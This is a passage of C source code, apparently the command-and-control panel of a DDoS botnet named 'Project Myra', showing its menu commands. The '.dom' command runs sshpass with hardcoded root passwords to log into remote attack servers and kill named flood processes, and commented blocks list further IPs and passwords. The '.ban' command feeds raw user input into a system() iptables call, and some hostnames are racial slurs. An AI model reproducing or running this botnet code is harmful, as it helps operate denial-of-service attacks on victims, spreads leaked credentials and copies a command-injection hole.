      sprintf(tools_menu23, "\e[38;5;225m╚══════════════════════╝╚══════════════════════════════════════════════════════╝\r\n");
      if (send(clear_myra_broadcast, tools_menu01, strlen(tools_menu01), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu02, strlen(tools_menu02), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu03, strlen(tools_menu03), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu04, strlen(tools_menu04), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu05, strlen(tools_menu05), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu06, strlen(tools_menu06), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu07, strlen(tools_menu07), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu08, strlen(tools_menu08), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu09, strlen(tools_menu09), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu10, strlen(tools_menu10), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu11, strlen(tools_menu11), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu12, strlen(tools_menu12), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu13, strlen(tools_menu13), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu14, strlen(tools_menu14), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu15, strlen(tools_menu15), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu16, strlen(tools_menu16), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu17, strlen(tools_menu17), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu18, strlen(tools_menu18), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu19, strlen(tools_menu19), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu20, strlen(tools_menu20), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu21, strlen(tools_menu21), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu22, strlen(tools_menu22), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, tools_menu23, strlen(tools_menu23), MSG_NOSIGNAL) == -1)
        goto finish_integer;
      //char menuoutput2[5000];
      //sprintf(menuoutput2,  "\e[38;5;225mWait until the \e[38;5;134mfull release \e[38;5;168m!\r\n");
      //if(send(clear_myra_broadcast, menuoutput2, strlen(menuoutput2),   MSG_NOSIGNAL) == -1) goto finish_integer;
      //TESTICLESpthread_create(&title, NULL, &myra_title_creator, sock);
      while (1)
      {
        sprintf(myra, "\e[38;5;134m[\e[38;5;225m%s\e[38;5;134m@\e[38;5;168mMyra\e[38;5;134m]\e[38;5;154m$\e[38;5;168m ", accounts[find_line].username, myra_buffer_size); // User Input - Hostname
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          goto finish_integer; // / Each Line Set on [MSG_NOSIGNAL] - Broadcast
        break;                 // Terminate Function Once Again, We Need More Stability..
      }
      continue;
    }
    if (strstr(myra_buffer_size, ".hashme") || strstr(myra_buffer_size, ".HASHME")) // System Command Function -- [TESTING HERE]
    {
      if (strcmp(VIP, accounts[find_line].identification_type) == 0) // Check If User Is Admin
      {
        //char tokensize [120];
        //char algorithm [120];
        //char newkey [120];
        //char successver [120];
        //sprintf(myra,     "\e[38;5;168mMyra is now running \e[38;5;134mseveral hash functions..\r\n");
        //sprintf(tokensize,  "\e[38;5;168mGenerating \e[38;5;134mnew token \e[38;5;168msize\e[38;5;16m..\r\n");
        //sprintf(algorithm,  "\e[38;5;168mReconfiguring \e[38;5;134malgorithmic security \e[38;5;168mstructure\e[38;5;134m..\r\n");
        //sprintf(newkey,     "\e[38;5;168mVerifiying new \e[38;5;134mkey \e[38;5;168mfor [\e[38;5;134m%s\e[38;5;168m]\e[38;5;134m..\r\n", accounts[find_line].username, myra_buffer_size);
        //sprintf(successver, "\e[38;5;134mVerification successful \e[38;5;168m! \e[38;5;134mHash randomised \e[38;5;168m!\r\n");
        //if(send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast        sleep(1);
        //sleep(1);
        //if(send(clear_myra_broadcast, tokensize, strlen(tokensize), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        //sleep(3);
        //if(send(clear_myra_broadcast, algorithm, strlen(algorithm), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        //sleep(1);
        //if(send(clear_myra_broadcast, newkey, strlen(newkey), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
        //if(send(clear_myra_broadcast, successver, strlen(successver), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast;
        char menuoutput3[5000];
        sprintf(menuoutput3, "\e[38;5;225mWait until the \e[38;5;134mfull release \e[38;5;168m!\r\n");
        if (send(clear_myra_broadcast, menuoutput3, strlen(menuoutput3), MSG_NOSIGNAL) == -1)
          goto finish_integer;
      }
      else
      {
        sprintf(myra, "\e[38;5;134mVIP's Only!!\r\n");
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          ; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
    }
    if (strstr(myra_buffer_size, ".kick") || strstr(myra_buffer_size, ".KICK")) // System Command Function -- [TESTING HERE]
    {
      if (strcmp(Admin, accounts[find_line].identification_type) == 0) // Check If User Is Admin
      {
        char dy[200];
        char done[200];
        sprintf(dy, "\x1b[1;37menter user id\x1b[1;31m: \x1b[1;37m");
        if (send(clear_myra_broadcast, dy, strlen(dy), MSG_NOSIGNAL) == -1)
          return;
        memset(myra_buffer_size, 0, sizeof(myra_buffer_size));
        if (buffer_size_string_compare(myra_buffer_size, sizeof(myra_buffer_size), clear_myra_broadcast) < 1)
          return;
        trim_removev2(myra_buffer_size);
        int fd = myra_buffer_size;
        close(fd);
      }
      else
      {
        sprintf(myra, "\e[38;5;134mOwners Only!!\r\n");
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          ; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
    }
    //if (strstr(myra_buffer_size, ".hfbijhbvsbv") || strstr(myra_buffer_size, ".ijasncjiadnc)) // System Command Function -- [TESTING HERE]
    {
      //if(strcmp(Admin, accounts[find_line].identification_type) == 0) // Check If User Is Admin
      {
          /*

        screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.121.111 pkill perl
        screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.175.236 pkill perl
        screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.181.196 pkill perl
        screen -d -m sshpass -P suckyourdad1234@ ssh root@78.46.181.199 pkill perl



          */
          //char command[50];
          //trim_removev2(command);
          //char command2[50];
          //trim_removev2(command2);
          //char command3[50];
          //trim_removev2(command3);
          //char command4[50];
          //trim_removev2(command4);
          //char command5[50];
          //trim_removev2(command5);
          //char command6[50];
          ////trim_removev2(command6);
          //char command7[50];
          //trim_removev2(command7);
          //char command8[50];
          //trim_removev2(command8);
          //strcpy(command, "screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.121.111 pkill perl" );
          //strcpy(command2, "screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.175.236 pkill perl" );
          //strcpy(command3, "screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.181.196 pkill perl" );
          //strcpy(command4, "screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.181.199 pkill perl" );
          //strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.172.129 pkill perl" );
          ////strcpy(command6, "screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.175.235 pkill perl" );
          //strcpy(command7, "screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.175.234 pkill perl" );
          //strcpy(command8, "screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.175.3 pkill perl" );
          //system(command);
          //system(command2);
          //system(command3);
          //system(command4);
          //system(command5);
          ////system(command6);
          //system(command7);
          //system(command8);
          //sprintf(myra, "\e[38;5;134mOh dang homie, You really dropping those attacks? Oki fine <3\r\n");
          //if(send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1) return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      //else
      {
        //sprintf(myra, "\e[38;5;134mOwners Only!!\r\n");
        //if(send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1); // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
    }
    if (strstr(myra_buffer_size, ".dom") || strstr(myra_buffer_size, ".DOM")) // System Command Function -- [TESTING HERE]
    {
      if (strcmp(Admin, accounts[find_line].identification_type) == 0) // Check If User Is Admin
      {                                                                /*

        screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.121.111 pkill perl
        screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.175.236 pkill perl
        screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.181.196 pkill perl
        screen -d -m sshpass -P suckyourdad1234@ ssh root@78.46.181.199 pkill perl



          */
        //char command[500];
        //trim_removev2(command);
        //char command2[500];
        //trim_removev2(command2);
        //char command3[500];
        //trim_removev2(command3);
        //char command4[500];
        //trim_removev2(command4);
        char command5[500];
        trim_removev2(command5);
        //char command6[500];
        //trim_removev2(command6);
        char command7[500];
        trim_removev2(command7);
        char command8[500];
        trim_removev2(command8);
        char command9[500];
        trim_removev2(command9);
        //char command10[500];
        //trim_removev2(command10);
        //char command11[500];
        //trim_removev2(command11);
        //char command12[500];
        //trim_removev2(command12);
        //char command13[500];
        //trim_removev2(command13);
        //strcpy(command, "screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.121.111 pkill perl" );
        //strcpy(command2, "screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.175.236 pkill perl" );
        //strcpy(command3, "screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.181.196 pkill perl" );
        //strcpy(command4, "screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.181.199 pkill perl" );
        strcpy(command5, "screen -d -m sshpass -p suckyourdad1234@ ssh root@nigger1 \"pkill vulcan; pkill node; pkill ares; pkill ark-drop; pkill athena; pkill aura; pkill gme-brk; pkill chimera; pkill csgo; pkill dracula; pkill fn-lag; pkill fn-drop; pkill gunther; pkill home; pkill katura; pkill nikolai; pkill odin; pkill phoenix; pkill r6-drop; pkill witch; pkill ceres; pkill zeus\"");
        //strcpy(command6, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@mainnig \"pkill nein; pkill vulcan; pkill ares; pkill ark-drop; pkill athena; pkill aura; pkill gme-brk; pkill chimera; pkill csgo; pkill dracula; pkill fn-lag; pkill fn-drop; pkill gunther; pkill home; pkill katura; pkill nikolai; pkill odin; pkill phoenix; pkill r6-drop; pkill witch; pkill ceres; pkill zeus\"" );
        strcpy(command7, "screen -d -m sshpass -p IAmSLightLYBLACK331 ssh root@nigger2 \"pkill vulcan; pkill ares; pkill ark-drop; pkill athena; pkill aura; pkill gme-brk; pkill chimera; pkill csgo; pkill dracula; pkill fn-lag; pkill fn-drop; pkill gunther; pkill home; pkill katura; pkill nikolai; pkill odin; pkill phoenix; pkill r6-drop; pkill witch; pkill ceres; pkill zeus\"");
        strcpy(command8, "screen -d -m sshpass -p tillwefall1234@ ssh root@nigger3 \"pkill vulcan; pkill ares; pkill ark-drop; pkill athena; pkill aura; pkill gme-brk; pkill chimera; pkill csgo; pkill dracula; pkill fn-lag; pkill fn-drop; pkill gunther; pkill home; pkill katura; pkill nikolai; pkill odin; pkill phoenix; pkill r6-drop; pkill witch; pkill ceres; pkill zeus\"");
        strcpy(command9, "screen -d -m sshpass -p tillwefall1234@ ssh root@nigger4 \"pkill vulcan; pkill ares; pkill ark-drop; pkill athena; pkill aura; pkill gme-brk; pkill chimera; pkill csgo; pkill dracula; pkill fn-lag; pkill fn-drop; pkill gunther; pkill home; pkill katura; pkill nikolai; pkill odin; pkill phoenix; pkill r6-drop; pkill witch; pkill ceres; pkill zeus\"");
        //strcpy(command10, "screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.172.129 pkill perl" );
        //strcpy(command11, "screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.175.235 pkill perl" );
        //strcpy(command12, "screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.175.234 pkill perl" );
        //strcpy(command13, "screen -d -m sshpass -p suckyourdad1234@ ssh root@78.46.175.3 pkill perl" );
        //system(command);
        //system(command2);
        //system(command3);
        //system(command4);
        system(command5);
        //system(command6);
        system(command7);
        system(command8);
        system(command9);
        //system(command10);
        //system(command11);
        //system(command12);
        //system(command13);
        sprintf(myra, "\e[38;5;134mOkay Dommy, We have aborted your eskimo babies !\r\n");
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
      else
      {
        sprintf(myra, "\e[38;5;134mOwners Only!!\r\n");
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          ; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
    }
    if (strstr(myra_buffer_size, ".detail-attacks") || strstr(myra_buffer_size, ".detail-ATTACKS")) // System Command Function -- [TESTING HERE]
    {
      if (strcmp(VIP, accounts[find_line].identification_type) == 0) // Check If User Is Admin
      {
        FILE *fp;
        char *ip[5000];
        char path[5000];
        /* Open the command for reading. */
        sprintf(ip, "screen -ls");
        fp = popen(ip, "r");
        if (fp == NULL)
        {
          printf("Failed to run command\n");
          exit(1);
        }
        /* Read the output a line at a time - output it. */
        while (fgets(path, sizeof(path), fp) != NULL)
        {
          char puta[5000];
          sprintf(puta, "\r \e[38;5;225m%s", path);
          if (send(clear_myra_broadcast, puta, strlen(puta), MSG_NOSIGNAL) == -1)
            return;
        }
        /* close */
        pclose(fp);
        char extra[120];
        sprintf(myra, "\r \e[38;5;134mRunning sockets should be displayed!\r\n");
        sprintf(extra, " \e[38;5;134mNote - Myra-Network is \e[38;5;168mNOT \e[38;5;134man attack.\r\n");
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, extra, strlen(extra), MSG_NOSIGNAL) == -1)
          return;
      }
      else
      {
        sprintf(myra, "\e[38;5;134mVIP's Only !\r\n");
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          ; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
    }
    if (strstr(myra_buffer_size, ".iiiiii") || strstr(myra_buffer_size, ".iiiiiii")) // System Command Function -- [TESTING HERE]
    {
      if (strcmp(VIP, accounts[find_line].identification_type) == 0) // Check If User Is Admin
      {
        char creds_01[120];
        char creds_02[120];
        char creds_03[120];
        char creds_04[120];
        char creds_05[120];
        char creds_06[120];
        char creds_07[120];
        char creds_08[120];
        char creds_09[120];
        char creds_10[120];
        char creds_11[120];
        char creds_12[120];
        char creds_13[120];
        char creds_14[120];
        char creds_15[120];
        char creds_16[120];
        char creds_17[120];
        sprintf(creds_01, "\e[38;5;225m╔═════════════════════╗\r\n");
        sprintf(creds_02, "\e[38;5;225m║ \e[38;5;168mProject Myra. \e[38;5;134mII\e[38;5;168m. \e[38;5;225m  ║\r\n");
        sprintf(creds_03, "\e[38;5;225m║ \e[38;5;134mRemastered\e[38;5;168m.         \e[38;5;225m║\r\n");
        sprintf(creds_04, "\e[38;5;225m╚═════════════════════╝\r\n");
        sprintf(creds_05, "      \e[38;5;225m╔═════════════════╗\r\n");
        sprintf(creds_06, "      \e[38;5;225m║ \e[38;5;134mSpecial Thanks  \e[38;5;225m║\r\n");
        sprintf(creds_07, "      \e[38;5;225m╚═════════════════╝\r\n");
        sprintf(creds_08, "                  \e[38;5;225m╔══════════════╗\r\n");
        sprintf(creds_09, "                  \e[38;5;225m║ \e[38;5;168mGppie        \e[38;5;225m║\r\n");
        sprintf(creds_10, "                  \e[38;5;225m║ \e[38;5;168mCpke         \e[38;5;225m║\r\n");
        sprintf(creds_11, "                  \e[38;5;225m║ \e[38;5;168mVerism       \e[38;5;225m║    ╔═════════════════╗\r\n");
        sprintf(creds_12, "                  \e[38;5;225m║ \e[38;5;168mAtrionized   \e[38;5;225m║    ║    \e[38;5;134mDeveloper    \e[38;5;225m║\r\n");
        sprintf(creds_13, "                  \e[38;5;225m║ \e[38;5;168mSelfrepnetis \e[38;5;225m║    ╚═════════════════╝\r\n");
        sprintf(creds_14, "                  \e[38;5;225m║ \e[38;5;168mPhenomite    \e[38;5;225m║                   ╔═════════════════╗\r\n");
        sprintf(creds_15, "                  \e[38;5;225m║ \e[38;5;168mVurexium     \e[38;5;225m║                   ║ \e[38;5;168mTransmissional  \e[38;5;225m║\r\n");
        sprintf(creds_16, "                  \e[38;5;225m║ \e[38;5;168mSwitch       \e[38;5;225m║                   ╚═════════════════╝\r\n");
        sprintf(creds_17, "                  \e[38;5;225m╚══════════════╝\r\n");
        if (send(clear_myra_broadcast, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1)
          goto finish_integer;
        if (send(clear_myra_broadcast, creds_01, strlen(creds_01), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, creds_02, strlen(creds_02), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, creds_03, strlen(creds_03), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, creds_04, strlen(creds_04), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, creds_05, strlen(creds_05), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, creds_06, strlen(creds_06), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, creds_07, strlen(creds_07), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, creds_08, strlen(creds_08), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, creds_09, strlen(creds_09), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, creds_10, strlen(creds_10), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, creds_11, strlen(creds_11), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, creds_12, strlen(creds_12), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, creds_13, strlen(creds_13), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, creds_14, strlen(creds_14), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, creds_15, strlen(creds_15), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, creds_16, strlen(creds_16), MSG_NOSIGNAL) == -1)
          return;
        if (send(clear_myra_broadcast, creds_17, strlen(creds_17), MSG_NOSIGNAL) == -1)
          return;
      }
      else
      {
        sprintf(myra, "\e[38;5;134mOwners Only!!\r\n");
        if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
          ; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
      }
    }
    if (strstr(myra_buffer_size, ".ban") || strstr(myra_buffer_size, ".BAN")) // System Command Function
    {
      char iptarget[5000];                                                   // Char Every Line For Output Communication
      char *token = strtok(myra_buffer_size, " ");                           // Create Delimiter
      snprintf(iptarget, sizeof(iptarget), "%s", token + strlen(token) + 1); // String Comparison From User Input - Using Token Size
      trim_removev2(iptarget);                                               // Trim [iptarget]
      char *ipkill[5000];                                                    // Creating A System Function
      trim_removev2(ipkill);                                                 // Trim [ipkill]
      sprintf(ipkill, "iptables -A INPUT -s %s -j DROP", iptarget);          // Default Time Has Been Set To 30 Seconds. Default Port Is 62141
      system(ipkill);                                                        // System Execution
      sprintf(myra, "\e[38;5;168mIP:\e[38;5;225m[\e[38;5;168m%s\e[38;5;225m] \e[38;5;168mBanned!\r\n", iptarget);
      if (send(clear_myra_broadcast, myra, strlen(myra), MSG_NOSIGNAL) == -1)
        return; // Each Line Set on [MSG_NOSIGNAL] - Broadcast
    }
    if (strstr(myra_buffer_size, ".info") || strstr(myra_buffer_size, ".INFO")) // System Command Function
    {
      char happen_01[120];
      char happen_02[120];
      char happen_03[120];
      char happen_04[120];
      char happen_05[120];
      char happen_06[120];
      char happen_07[120];
      char happen_08[120];
      char happen_09[120];
      char happen_10[120];
      sprintf(happen_01, "\e[38;5;168mThe \e[38;5;134mMyra Initiative \e[38;5;168mwas designed by myself. This was designed after me and\r\n");
      sprintf(happen_02, "\e[38;5;168mCri abandoned another C2 Project called '\e[38;5;134mProject katura.' \e[38;5;168mNow, Cri was unhappy\r\n");
      sprintf(happen_03, "\e[38;5;168mthat I had taken \e[38;5;134mMyra development \e[38;5;168minto \e[38;5;134mfull time\e[38;5;168m. Allowing me to create a \r\n");
      sprintf(happen_04, "\e[38;5;168mstable project with a decent amount of financial income. Cri stopped devlpmnt\r\n");
      sprintf(happen_05, "\e[38;5;168mfor \e[38;5;134m8 months due \e[38;5;168mto \e[38;5;134mmental health deterioration from one of his \e[38;5;134megirls. \e[38;5;168mHe\r\n");
      sprintf(happen_06, "\e[38;5;168mthought I was being one sided with the entire project and decided to leak it.\r\n");
      sprintf(happen_07, "\e[38;5;168m \r\n");
      sprintf(happen_08, "\e[38;5;168mDue to the leak, I decided to completely \e[38;5;134mrecreate Project Myra\e[38;5;168m. \r\n");
      sprintf(happen_09, "\e[38;5;168mAnd now he cannot do \e[38;5;134mshit\e[38;5;168m.\r\n");
      sprintf(happen_10, "\e[38;5;134mCapabilities Exceed.\r\n");
      if (send(clear_myra_broadcast, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1)
        goto finish_integer;
      if (send(clear_myra_broadcast, happen_01, strlen(happen_01), MSG_NOSIGNAL) == -1)
        return;
      if (send(clear_myra_broadcast, happen_02, strlen(happen_02), MSG_NOSIGNAL) == -1)
        return;
      if (send(clear_myra_broadcast, happen_03, strlen(happen_03), MSG_NOSIGNAL) == -1)
        return;
      if (send(clear_myra_broadcast, happen_04, strlen(happen_04), MSG_NOSIGNAL) == -1)
        return;
      if (send(clear_myra_broadcast, happen_05, strlen(happen_05), MSG_NOSIGNAL) == -1)
        return;
      if (send(clear_myra_broadcast, happen_06, strlen(happen_06), MSG_NOSIGNAL) == -1)
        return;
      if (send(clear_myra_broadcast, happen_07, strlen(happen_07), MSG_NOSIGNAL) == -1)
        return;
      if (send(clear_myra_broadcast, happen_08, strlen(happen_08), MSG_NOSIGNAL) == -1)
        return;
      if (send(clear_myra_broadcast, happen_09, strlen(happen_09), MSG_NOSIGNAL) == -1)
        return;
      if (send(clear_myra_broadcast, happen_10, strlen(happen_10), MSG_NOSIGNAL) == -1)
        return;
    }
    if (strstr(myra_buffer_size, ".creds") || strstr(myra_buffer_size, ".CREDS")) // System Command Function
    {
      //char creds_01 [120];
      //char creds_02 [120];
      //char creds_03 [120];
      //char creds_04 [120];
      //char creds_05 [120];
      //char creds_06 [120];
      //char creds_07 [120];
      //char creds_08 [120];
      //char creds_09 [120];
      //char creds_10 [120];
      //char creds_11 [120];
      //char creds_12 [120];
      //char creds_13 [120];
      //char creds_14 [120];
      //char creds_15 [120];
      //char creds_16 [120];
      //char creds_17 [120];
      //sprintf(creds_01,  "\e[38;5;225m╔═════════════════════╗\r\n");
      //sprintf(creds_02,  "\e[38;5;225m║ \e[38;5;168mProject Myra. \e[38;5;134mII\e[38;5;168m. \e[38;5;225m║\r\n");
      //sprintf(creds_03,  "\e[38;5;225m║ \e[38;5;134mRemastered\e[38;5;168m.         \e[38;5;225m║\r\n");
      //sprintf(creds_04,  "\e[38;5;225m╚═════════════════════╝\r\n");
      //sprintf(creds_05,  "      \e[38;5;225m╔═════════════════╗\r\n");
      //sprintf(creds_06,  "      \e[38;5;225m║ \e[38;5;134mSpecial Thanks  \e[38;5;225m║\r\n");
      //sprintf(creds_07,  "      \e[38;5;225m╚═════════════════╝\r\n");
      //sprintf(creds_08,  "                  \e[38;5;225m╔══════════════╗\r\n");
      //sprintf(creds_09,  "                  \e[38;5;225m║ \e[38;5;168mGppie        \e[38;5;225m║\r\n");
      //sprintf(creds_10,  "                  \e[38;5;225m║ \e[38;5;168mCpke         \e[38;5;225m║\r\n");
      //sprintf(creds_11,  "                  \e[38;5;225m║ \e[38;5;168mVerism       \e[38;5;225m║    ╔═════════════════╗\r\n");
      //sprintf(creds_12,  "                  \e[38;5;225m║ \e[38;5;168mAtrionized   \e[38;5;225m║    ║    \e[38;5;134mDeveloper    \e[38;5;225m║\r\n");
      //sprintf(creds_13,  "                  \e[38;5;225m║ \e[38;5;168mSelfrepnetis \e[38;5;225m║    ╚═════════════════╝\r\n");
      //sprintf(creds_14,  "                  \e[38;5;225m║ \e[38;5;168mPhenomite    \e[38;5;225m║                   ╔═════════════════╗\r\n");
      //sprintf(creds_15,  "                  \e[38;5;225m║ \e[38;5;168mVurexium     \e[38;5;225m║                   ║ \e[38;5;168mTransmissional  \e[38;5;225m║\r\n");
      //sprintf(creds_16,  "                  \e[38;5;225m║ \e[38;5;168mSwitch       \e[38;5;225m║                   ╚═════════════════╝\r\n");
      //sprintf(creds_17,  "                  \e[38;5;225m╚══════════════╝\r\n");
      //if (send(clear_myra_broadcast, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto finish_integer;
      //if(send(clear_myra_broadcast, creds_01, strlen(creds_01), MSG_NOSIGNAL) == -1) return;
      //if(send(clear_myra_broadcast, creds_02, strlen(creds_02), MSG_NOSIGNAL) == -1) return;
      //if(send(clear_myra_broadcast, creds_03, strlen(creds_03), MSG_NOSIGNAL) == -1) return;
      //if(send(clear_myra_broadcast, creds_04, strlen(creds_04), MSG_NOSIGNAL) == -1) return;
      //if(send(clear_myra_broadcast, creds_05, strlen(creds_05), MSG_NOSIGNAL) == -1) return;
      //if(send(clear_myra_broadcast, creds_06, strlen(creds_06), MSG_NOSIGNAL) == -1) return;
      //if(send(clear_myra_broadcast, creds_07, strlen(creds_07), MSG_NOSIGNAL) == -1) return;
      //if(send(clear_myra_broadcast, creds_08, strlen(creds_08), MSG_NOSIGNAL) == -1) return;
      //if(send(clear_myra_broadcast, creds_09, strlen(creds_09), MSG_NOSIGNAL) == -1) return;
      //if(send(clear_myra_broadcast, creds_10, strlen(creds_10), MSG_NOSIGNAL) == -1) return;
      //if(send(clear_myra_broadcast, creds_11, strlen(creds_11), MSG_NOSIGNAL) == -1) return;
      //if(send(clear_myra_broadcast, creds_12, strlen(creds_12), MSG_NOSIGNAL) == -1) return;
      //if(send(clear_myra_broadcast, creds_13, strlen(creds_13), MSG_NOSIGNAL) == -1) return;
      //if(send(clear_myra_broadcast, creds_14, strlen(creds_14), MSG_NOSIGNAL) == -1) return;
      //if(send(clear_myra_broadcast, creds_15, strlen(creds_15), MSG_NOSIGNAL) == -1) return;
      //if(send(clear_myra_broadcast, creds_16, strlen(creds_16), MSG_NOSIGNAL) == -1) return;
      //if(send(clear_myra_broadcast, creds_17, strlen(creds_17), MSG_NOSIGNAL) == -1) return;
      char menuoutput4[5000];
      sprintf(menuoutput4, "\e[38;5;225mWait until the \e[38;5;134mfull release \e[38;5;168m!\r\n");
      if (send(clear_myra_broadcast, menuoutput4, strlen(menuoutput4), MSG_NOSIGNAL) == -1)
        goto finish_integer;
    }
    if (strstr(myra_buffer_size, ".status") || strstr(myra_buffer_size, ".STATUS")) // System Command Function
    {
      char status01[500];
      char status02[500];
      char status03[500];
      char status04[500];
      char status05[500];
      char status06[500];
      char status07[500];
      char status08[500];
      char status09[500];
      char status10[500];
      char status11[500];
      char status12[500];
      char status13[500];
      char status14[500];
      char status15[500];
      char status16[500];
      char status17[500];
      char status18[500];
      char status19[500];
      char status20[500];
      char status21[500];
      char status22[500];
      char status23[500];
      sprintf(status01, "\e[38;5;225m╔═════════════════════════╗\r\n");
      sprintf(status02, "\e[38;5;225m║   \e[38;5;134mMyra \e[38;5;168mNetwork Status   \e[38;5;225m║\r\n");
      sprintf(status03, "\e[38;5;225m║          \e[38;5;225m[\e[38;5;134mV\e[38;5;225m]            ║\r\n");
      sprintf(status04, "\e[38;5;225m╚═════════════════════════╩╦══════════════════════════════════════╗\r\n");
      sprintf(status05, "     \e[38;5;225m╔═════════════════════╩═══╗\r\n");
      sprintf(status06, "     \e[38;5;225m║      \e[38;5;168mSubstrate \e[38;5;225m[\e[38;5;134mIV\e[38;5;225m]     ╠════\e[38;5;134m> \e[38;5;168mStatus \e[38;5;134m: \e[38;5;225mOnline  \e[38;5;134m!\r\n");
      sprintf(status07, "     \e[38;5;225m╚═════════════╦═══════════╝\r\n");
      sprintf(status08, "     \e[38;5;225m╔═════════════╩═══════════╗\r\n");
